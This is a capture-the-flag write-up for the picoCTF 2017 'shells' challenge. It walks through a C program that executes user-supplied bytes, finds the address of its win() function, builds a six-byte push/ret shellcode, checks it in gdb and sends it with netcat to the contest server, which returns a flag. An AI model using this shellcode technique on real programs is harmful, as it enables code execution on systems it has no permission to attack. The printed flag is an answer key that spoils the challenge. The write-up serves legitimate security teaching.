# shells [ 70 Pts ]

## Problem

How much can a couple bytes do? Use [shells](./shells)! [Source](./shells.c). Connect on shell2017.picoctf.com:40976.

## Approach

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 10

//TODO: Ask IT why this is here
void win(){
    system("/bin/cat ./flag.txt");    
}


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();      
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}
```

In the source code, we see a `win()` function that will gives us the flag. There are many ways to obtain the address.

### Obtain Address

#### Method 1
```
$ readelf -s shells | grep win
    65: 08048540    24 FUNC    GLOBAL DEFAULT   13 win
```

#### Method 2
```
$ objdump -D shells | grep win
08048540 <win>:
```

#### Method 3
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08048378  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  fflush@plt
0x080483e0  puts@plt
0x080483f0  system@plt
0x08048400  __gmon_start__@plt
0x08048410  exit@plt
0x08048420  mmap@plt
0x08048430  __libc_start_main@plt
0x08048440  _start
0x08048470  __x86.get_pc_thunk.bx
0x08048480  deregister_tm_clones
0x080484b0  register_tm_clones
0x080484f0  __do_global_dtors_aux
0x08048510  frame_dummy
0x08048540  win
0x08048560  vuln
0x08048610  main
0x08048670  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
```

### Vulnerability

```C
void (*func)() = (void (*)())stuff;
    func();
```

The vulnerability is this type casting of string to a function.
When string is type casted as a function, the string is treated as opcodes/instructions.

`func()` then uses a call to jump to the string to be executed in machine code.
This string to be executed cannot be written in higher languages but can be assisted with assembly language.

We commonly call this string as "shellcode" because many exploit writers will attempt to get a command shell.

### Simple Shellcode

```
$ echo "Flag{SampleFlag}" > flag.txt
```

First, we have to create a dummy flag.txt in our directory.

```
push 0x08048540
ret
```

Our shellcode can be as simple as the above. Ret will pop the value from the stack into the $eip.
$eip holds the address of the next instructions to be executed. Therefore, it will run win().

rasm2 is a good tool within the radare reverse engineering suite.

```
$ file shells
shells: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c9cc6ffcd23dbaaa4d94377fc63bdcff7009680b, not stripped
```

When writing shellcode, it is important to take note of the architecture (x86 or x64) and the cpu (intel, AMD, ARMs or MIPS, etc).

```
$ rasm2 -a x86 -c intel -
push 0x08048540
6840850408
ret
c3
```

Now that we have translated assembly code into bytes. We will have to try it out with gdb.

### GDB

```
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x08048560 <+0>:	push   ebp
   0x08048561 <+1>:	mov    ebp,esp
   0x08048563 <+3>:	sub    esp,0x18
   0x08048566 <+6>:	sub    esp,0x8
   0x08048569 <+9>:	push   0x0
   0x0804856b <+11>:	push   0x0
   0x0804856d <+13>:	push   0x22
   0x0804856f <+15>:	push   0x7
   0x08048571 <+17>:	push   0xa
   0x08048573 <+19>:	push   0x0
   0x08048575 <+21>:	call   0x8048420 <mmap@plt>
   0x0804857a <+26>:	add    esp,0x20
   0x0804857d <+29>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048580 <+32>:	cmp    DWORD PTR [ebp-0xc],0xffffffff
   0x08048584 <+36>:	jne    0x80485a0 <vuln+64>
   0x08048586 <+38>:	sub    esp,0xc
   0x08048589 <+41>:	push   0x8048714
   0x0804858e <+46>:	call   0x80483e0 <puts@plt>
   0x08048593 <+51>:	add    esp,0x10
   0x08048596 <+54>:	sub    esp,0xc
   0x08048599 <+57>:	push   0x0
   0x0804859b <+59>:	call   0x8048410 <exit@plt>
   0x080485a0 <+64>:	sub    esp,0x8
   0x080485a3 <+67>:	push   0xa
   0x080485a5 <+69>:	push   0x804873e
   0x080485aa <+74>:	call   0x80483c0 <printf@plt>
   0x080485af <+79>:	add    esp,0x10
   0x080485b2 <+82>:	mov    eax,ds:0x8049a60
   0x080485b7 <+87>:	sub    esp,0xc
   0x080485ba <+90>:	push   eax
   0x080485bb <+91>:	call   0x80483d0 <fflush@plt>
   0x080485c0 <+96>:	add    esp,0x10
   0x080485c3 <+99>:	sub    esp,0x4
   0x080485c6 <+102>:	push   0xa
   0x080485c8 <+104>:	push   DWORD PTR [ebp-0xc]
   0x080485cb <+107>:	push   0x0
   0x080485cd <+109>:	call   0x80483b0 <read@plt>
   0x080485d2 <+114>:	add    esp,0x10
   0x080485d5 <+117>:	mov    DWORD PTR [ebp-0x10],eax
   0x080485d8 <+120>:	cmp    DWORD PTR [ebp-0x10],0x0
   0x080485dc <+124>:	jne    0x80485f8 <vuln+152>
   0x080485de <+126>:	sub    esp,0xc
   0x080485e1 <+129>:	push   0x8048754
   0x080485e6 <+134>:	call   0x80483c0 <printf@plt>
   0x080485eb <+139>:	add    esp,0x10
   0x080485ee <+142>:	sub    esp,0xc
   0x080485f1 <+145>:	push   0x0
   0x080485f3 <+147>:	call   0x8048410 <exit@plt>
   0x080485f8 <+152>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485fb <+155>:	mov    DWORD PTR [ebp-0x14],eax
   0x080485fe <+158>:	mov    eax,DWORD PTR [ebp-0x14]
   0x08048601 <+161>:	call   eax
   0x08048603 <+163>:	leave  
   0x08048604 <+164>:	ret    
End of assembler dump.
gdb-peda$ break *vuln+158
Breakpoint 1 at 0x80485fe
```

We can break before `call eax` and see if our instruction is inputted correctly. It is important to check because little endian might require the shellcode to be input in reverse order.


```
gdb-peda$ run <<< $(python -c "print '6840850408c3'.decode('hex')")
Starting program: /home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/shells_70/shells <<< $(python -c "print '6840850408c3'.decode('hex')")
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:

[----------------------------------registers-----------------------------------]
EAX: 0xf7fd3000 --> 0x4854068 
EBX: 0x0 
ECX: 0xf7fd3000 --> 0x4854068 
EDX: 0xa ('\n')
ESI: 0xf7faa000 --> 0x1b1db0 
EDI: 0xf7faa000 --> 0x1b1db0 
EBP: 0xffffceb8 --> 0xffffcec8 --> 0x0 
ESP: 0xffffcea0 --> 0xf7faa000 --> 0x1b1db0 
EIP: 0x80485fe (<vuln+158>:	mov    eax,DWORD PTR [ebp-0x14])
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485f3 <vuln+147>:	call   0x8048410 <exit@plt>
   0x80485f8 <vuln+152>:	mov    eax,DWORD PTR [ebp-0xc]
   0x80485fb <vuln+155>:	mov    DWORD PTR [ebp-0x14],eax
=> 0x80485fe <vuln+158>:	mov    eax,DWORD PTR [ebp-0x14]
   0x8048601 <vuln+161>:	call   eax
   0x8048603 <vuln+163>:	leave  
   0x8048604 <vuln+164>:	ret    
   0x8048605:	lea    esi,[esi+eiz*1+0x0]
[------------------------------------stack-------------------------------------]
0000| 0xffffcea0 --> 0xf7faa000 --> 0x1b1db0 
0004| 0xffffcea4 --> 0xf7fd3000 --> 0x4854068 
0008| 0xffffcea8 --> 0x7 
0012| 0xffffceac --> 0xf7fd3000 --> 0x4854068 
0016| 0xffffceb0 --> 0xf7faad60 --> 0xfbad2a84 
0020| 0xffffceb4 --> 0xffffcf74 --> 0xffffd132 ("/home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/shells_70/shells")
0024| 0xffffceb8 --> 0xffffcec8 --> 0x0 
0028| 0xffffcebc --> 0x8048657 (<main+71>:	mov    eax,0x0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485fe in vuln ()
gdb-peda$ x/5i $ebp-0x14
   0xffffcea4:	add    BYTE PTR [eax],dh
   0xffffcea6:	std    
   0xffffcea7:	test   DWORD PTR [edi],0x0
   0xffffcead:	xor    ch,bh
   0xffffceaf:	mul    DWORD PTR [eax-0x53]
gdb-peda$ si



[----------------------------------registers-----------------------------------]
EAX: 0xf7fd3000 --> 0x4854068 
EBX: 0x0 
ECX: 0xf7fd3000 --> 0x4854068 
EDX: 0xa ('\n')
ESI: 0xf7faa000 --> 0x1b1db0 
EDI: 0xf7faa000 --> 0x1b1db0 
EBP: 0xffffceb8 --> 0xffffcec8 --> 0x0 
ESP: 0xffffcea0 --> 0xf7faa000 --> 0x1b1db0 
EIP: 0x8048601 (<vuln+161>:	call   eax)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485f8 <vuln+152>:	mov    eax,DWORD PTR [ebp-0xc]
   0x80485fb <vuln+155>:	mov    DWORD PTR [ebp-0x14],eax
   0x80485fe <vuln+158>:	mov    eax,DWORD PTR [ebp-0x14]
=> 0x8048601 <vuln+161>:	call   eax
   0x8048603 <vuln+163>:	leave  
   0x8048604 <vuln+164>:	ret    
   0x8048605:	lea    esi,[esi+eiz*1+0x0]
   0x8048609:	lea    edi,[edi+eiz*1+0x0]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffcea0 --> 0xf7faa000 --> 0x1b1db0 
0004| 0xffffcea4 --> 0xf7fd3000 --> 0x4854068 
0008| 0xffffcea8 --> 0x7 
0012| 0xffffceac --> 0xf7fd3000 --> 0x4854068 
0016| 0xffffceb0 --> 0xf7faad60 --> 0xfbad2a84 
0020| 0xffffceb4 --> 0xffffcf74 --> 0xffffd132 ("/home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/shells_70/shells")
0024| 0xffffceb8 --> 0xffffcec8 --> 0x0 
0028| 0xffffcebc --> 0x8048657 (<main+71>:	mov    eax,0x0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048601 in vuln ()
gdb-peda$ x/5i $eax
   0xf7fd3000:	push   0x8048540
   0xf7fd3005:	ret    
   0xf7fd3006:	or     al,BYTE PTR [eax]
   0xf7fd3008:	add    BYTE PTR [eax],al
   0xf7fd300a:	add    BYTE PTR [eax],al
```

From the above, we have inputted our shellcode and when examining the $eax as instructions, we see that our instructions did not get disrupted.

```
[----------------------------------registers-----------------------------------]
EAX: 0xf7fd3000 --> 0x4854068 
EBX: 0x0 
ECX: 0xf7fd3000 --> 0x4854068 
EDX: 0xa ('\n')
ESI: 0xf7faa000 --> 0x1b1db0 
EDI: 0xf7faa000 --> 0x1b1db0 
EBP: 0xffffceb8 --> 0xffffcec8 --> 0x0 
ESP: 0xffffce9c --> 0x8048603 (<vuln+163>:	leave)
EIP: 0x8048540 (<win>:	push   ebp)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804853b <frame_dummy+43>:	xchg   ax,ax
   0x804853d <frame_dummy+45>:	xchg   ax,ax
   0x804853f <frame_dummy+47>:	nop
=> 0x8048540 <win>:	push   ebp
   0x8048541 <win+1>:	mov    ebp,esp
   0x8048543 <win+3>:	sub    esp,0x8
   0x8048546 <win+6>:	sub    esp,0xc
   0x8048549 <win+9>:	push   0x8048700
[------------------------------------stack-------------------------------------]
0000| 0xffffce9c --> 0x8048603 (<vuln+163>:	leave)
0004| 0xffffcea0 --> 0xf7faa000 --> 0x1b1db0 
0008| 0xffffcea4 --> 0xf7fd3000 --> 0x4854068 
0012| 0xffffcea8 --> 0x7 
0016| 0xffffceac --> 0xf7fd3000 --> 0x4854068 
0020| 0xffffceb0 --> 0xf7faad60 --> 0xfbad2a84 
0024| 0xffffceb4 --> 0xffffcf74 --> 0xffffd132 ("/home/misskanari/fun/ctf/pico2017/PicoCtf2017-Write-up/level2/bin/shells_70/shells")
0028| 0xffffceb8 --> 0xffffcec8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048540 in win ()
gdb-peda$ c
Continuing.
[New process 9504]
process 9504 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
[New process 9505]
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
process 9505 is executing new program: /bin/cat
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Flag{SampleFlag}
[Inferior 3 (process 9505) exited normally]
Warning: not running or target is remote

```

By stepping more, we entered into the win() function and thus able to get our flag.

### Remote

The last thing to do is to netcat to the server and send our shellcode over to get the real flag.

```
$ python -c "print '6840850408c3'.decode('hex')" | nc shell2017.picoctf.com 40976
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 10 bytes:
cd875b6ffb5cdd3319532d52ceca71aa
```

(Completed)
